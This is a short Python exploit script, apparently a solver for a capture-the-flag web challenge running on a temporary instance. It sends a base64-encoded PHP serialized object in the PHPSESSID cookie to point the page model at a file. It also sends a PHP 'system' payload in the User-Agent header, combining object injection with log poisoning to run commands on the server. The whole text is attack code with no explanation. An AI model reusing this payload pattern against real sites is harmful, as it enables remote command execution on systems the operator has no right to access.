import requests

# CODE FOR THE COOKIE SHOWN AT THE BOTTOM OF THE SOURCE CODE
cookies = {'PHPSESSID': "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9"}
headers = {'User-Agent': "<?php system('ls -l /');?>"} 
url = "http://142.93.35.129:32553" # address and port changes whenever start a new instance of the website

response = requests.get(url, cookies=cookies, headers=headers)
webpage = response.text

print(response.text)